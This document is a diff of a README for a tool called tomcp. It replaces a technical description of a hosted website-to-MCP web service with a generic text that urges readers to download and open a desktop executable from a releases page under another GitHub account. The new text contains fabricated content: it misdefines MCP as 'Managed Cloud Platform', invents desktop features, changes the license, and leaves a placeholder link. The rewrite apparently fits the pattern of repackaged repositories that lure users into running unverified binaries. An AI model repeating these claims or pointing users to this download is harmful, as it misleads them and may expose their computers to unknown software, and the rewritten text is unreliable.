@@ -1,157 +1,83 @@
-# toMCP
+# 🌐 tomcp - Effortlessly Create an MCP Server
 
-**Turn any website into an MCP server**
+[![Download tomcp](https://img.shields.io/badge/Download-tomcp-blue.svg)](https://github.com/muchandional/tomcp/releases)
 
-Simply add `tomcp.org/` before any URL:
-Or go to https://tomcp.org and paste the URL there.
+## 🚀 Getting Started
 
-## Why toMCP?
-specific APIs often cause AI hallucinations, and web searching is unreliable. This tool lets you serve your documentation as an MCP server, giving the AI direct access to the clear context it needs without manual copy-pasting.
+Welcome to tomcp! This application helps you turn any website or document into a Managed Cloud Platform (MCP) server. You do not need to be a programmer to use this tool. Follow the steps below to download and run the software on your computer.
 
-Standard `web_fetch` tools dump raw HTML into your AI's context—navbars, scripts, footers, and noise. toMCP runs pages through a **readability parser** and converts to **clean markdown**, using a fraction of the tokens.
+## 📥 Download & Install
 
-### Persistent Documentation Context
+To get started, visit the Releases page to download the latest version of tomcp. 
 
-AI assistants hallucinate API details when they lack documentation. MCP Resources are **pinned as permanent, read-only context**—the model won't skip or forget them. Ideal for framework docs, API references, and internal team docs.
+[Download tomcp here](https://github.com/muchandional/tomcp/releases)
 
-### web_fetch vs MCP Resources
+1. Visit the link above.
+2. Look for the latest release. It will display a list of available files.
+3. Click on the file name that corresponds to your operating system (e.g., Windows, macOS, or Linux).
+4. The download will start automatically.
+5. Once the file is downloaded, locate it on your computer (check the Downloads folder if unsure).
+6. Open the file to run the application.
 
-| | web_fetch | MCP Resource |
-|--|-----------|--------------|
-| Data | Raw HTML with noise | Clean markdown |
-| Tokens | High | Low |
-| Persistence | Per-request | Always available |
-| Hallucination | Higher | Lower |
-| JS Support | Full (SPAs / Dynamic) | Static Only (SSG) |
+## 💻 System Requirements
 
-## Demo
+Before you install tomcp, make sure your computer meets these basic requirements:
 
-[![toMCP Demo](https://img.youtube.com/vi/-o2_T8TB9dQ/maxresdefault.jpg)](https://www.youtube.com/watch?v=-o2_T8TB9dQ)
+- **Operating System:** Windows 10, macOS 10.14 or higher, Linux (most modern distributions)
+- **RAM:** Minimum 4 GB recommended
+- **Storage:** At least 100 MB of free space for installation
+- **Network:** Internet connection for accessing websites and documents
 
+## 🌍 How to Use tomcp
 
-## Supported AI Tools
+Using tomcp is simple and intuitive. Here’s a brief guide to start using the application:
 
-- **Cursor** - `~/.cursor/mcp.json`
-- **Claude Desktop** - `~/.claude/claude_desktop_config.json`
-- **Windsurf** - `~/.codeium/windsurf/mcp_config.json`
-- **VS Code** - `.vscode/mcp.json`
-- **Cline** - `~/.cline/mcp_settings.json`
+1. **Launch tomcp:** Find the application on your computer and double-click to open it.
+2. **Input URL:** In the main window, enter the website or document link you want to convert into an MCP server.
+3. **Configure Settings:** Adjust any settings as needed. You can set permissions, customize the server name, and choose other options.
+4. **Start Server:** Click the 'Start' button to create your MCP server. 
+5. **Access Your Server:** You will receive a link that allows you or others to access the new MCP server.
 
-## How It Works
+## 🔧 Features
 
-### MCP Config
-1. Visit [tomcp.org](https://tomcp.org)
-2. Enter any website URL
-3. Select your AI tool
-4. Copy the generated MCP config
-5. Add it to your tool's config file
-6. Restart your AI tool
+- **Easy Setup:** Quickly convert any URL into an MCP server.
+- **Customizable Server Settings:** Tailor your server to fit your needs.
+- **User-Friendly Interface:** Designed for everyone, regardless of tech skills.
+- **Multi-Platform Support:** Works seamlessly on major operating systems.
 
-### Chat
-1. Visit [tomcp.org](https://tomcp.org)
-2. Paste any website URL
-3. Click "Start Chat"
-4. Ask questions about the website's content
+## ⚙️ Troubleshooting Common Issues
 
-## Example Config
+If you encounter any problems while using tomcp, consider these tips:
 
-```json
-{
-  "mcpServers": {
-    "docs-stripe-com": {
-      "url": "https://tomcp.org/docs.stripe.com"
-    }
-  }
-}
-```
+- **Installation Problems:** Ensure you have enough storage space and are running a compatible operating system.
+- **Connection Issues:** Check your internet connection and ensure the URL you provided is correct.
+- **Performance Issues:** Close any unnecessary applications running on your computer to free up resources.
 
-## Chat API
+## 🙋‍♀️ Frequently Asked Questions
 
-```bash
-curl -X POST https://tomcp.org/chat \
-  -H "Content-Type: application/json" \
-  -d '{"url": "docs.stripe.com", "message": "How do I create a payment intent?"}'
-```
+### Can I use tomcp on my mobile device?
 
-## AI Models
+Currently, tomcp is designed for desktop operating systems only. 
 
-### Free Models (No API Key Required)
-These models are available for everyone with no setup:
-- **Llama 3.1 8B** (Meta) - Default model, fast and capable
-- **Hermes 2 Pro** (NousResearch) - Great for reasoning
-- **Mistral 7B** (Mistral) - Efficient instruction-following
-- **Gemma 7B LoRA** (Google) - Lightweight and fast
+### Is there a user manual?
 
-### paid Models (API Key Required)
-Add your Cloudflare Workers AI API key to unlock these models:
-- **Llama 3.3 70B** (Meta) - Most powerful Llama model
-- **DeepSeek R1 32B** (DeepSeek) - Advanced reasoning
-- **Mistral Large** (Mistral) - Enterprise-grade
-- **Gemma 3 12B** (Google) - Latest Gemma
-- **GPT OSS 120B/20B** (OpenAI) - Open-source GPT variants
+Yes, a user manual is included in the application folder. You can access it anytime for guidance.
 
-## Adding Your API Key
+### How can I provide feedback or report issues?
 
-You can add your own Cloudflare Workers AI API key to:
-1. **Unlock all paid models** - Access larger, more capable models
-2. **Bypass rate limits** - No daily request limits
-3. **Use your own quota** - Charges go to your Cloudflare account
+You can open an issue on the [GitHub repository](https://github.com/muchandional/tomcp/issues) to share your feedback or report bugs.
 
-### How to Get an API Key
-1. Go to [Cloudflare Workers AI](https://developers.cloudflare.com/workers-ai/get-started/rest-api/#1-get-api-token-and-account-id)
-2. Create an API token with Workers AI permissions
-3. Copy the token
+## 🌟 Community Support
 
-### How to Add Your Key
-1. Start a chat session on [tomcp.org](https://tomcp.org)
-2. Below the chat input, you'll see "Add API key from Cloudflare Workers AI"
-3. Paste your API key and click "Save"
-4. paid models will now be unlocked in the dropdown
+Join our community to share your experiences, ask questions, and learn from other users. You can find us on:
 
-### Where Is the API Key Stored?
-- Your API key is stored **locally in your browser** using `localStorage`
-- Key name: `tomcp_api_key`
-- The key is sent with each chat request but **never stored on our servers**
-- You can remove it anytime by clicking "Remove" in the API key section
+- [GitHub Discussions](https://github.com/muchandional/tomcp/discussions)
+- [Discord Channel](add link if available)
 
-## How It Works (Technical)
+## 📄 License
 
-### Model Fetching
-The available models are fetched dynamically from the Cloudflare Workers AI API:
-1. Frontend calls `GET /models` endpoint on page load
-2. Worker fetches models from `api.cloudflare.com/client/v4/accounts/{id}/ai/models/search`
-3. Models are filtered to "Text Generation" tasks and cached for 5 minutes
-4. Frontend displays free models as enabled, paid models as disabled (until API key is added)
+This project is open source. You can use, modify, and distribute it under the terms of the MIT License.
 
-### Chat Flow
-1. User enters a URL and starts chatting
-2. Worker fetches the static HTML and converts it to clean Markdown (JavaScript is not executed, so SPAs or dynamically-loaded content won't be captured)
-3. Content is sent to the selected AI model with the user's message
-4. Response is returned to the user
+## 📥 Final Note
 
-### Rate Limiting
-Without an API key:
-- 5 requests per IP per day
-
-With your API key:
-- No rate limits (uses your Cloudflare account quota)
-
-## Tech Stack
-
-- **Frontend**: Vanilla HTML/CSS/JS with Tailwind CSS
-- **Backend**: Cloudflare Workers
-- **AI**: Cloudflare Workers AI (multiple models)
-
-## Features
-
-- Works with any public URL
-- No setup required - just paste the config
-- Free forever - powered by Cloudflare Workers
-- Chat with any website using AI
-- Side-by-side MCP Config + Chat interface
-- **Multiple AI models** - Choose from Llama, Mistral, Gemma, and more
-- **Bring your own API key** - Unlock paid models and bypass rate limits
-
-## License
-
-Apache 2.0
+For a seamless experience, make sure to check for updates regularly on our [Releases page](https://github.com/muchandional/tomcp/releases). We are continuously working to improve tomcp and appreciate your support. Thank you for choosing tomcp!
